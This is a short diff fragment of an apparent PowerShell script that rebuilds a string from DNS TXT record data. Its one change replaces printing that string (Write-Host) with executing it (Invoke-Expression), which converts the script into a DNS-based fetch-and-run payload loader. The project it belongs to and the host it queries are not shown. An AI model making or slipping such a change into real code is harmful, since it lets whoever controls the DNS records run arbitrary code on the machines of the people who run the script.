@@ -20,4 +20,4 @@ for ($i=0; $i -lt $dns_result.Strings.length; $i++) {
     }
 }
 
-Write-Host $deconstructed_query
+Invoke-Expression $deconstructed_query
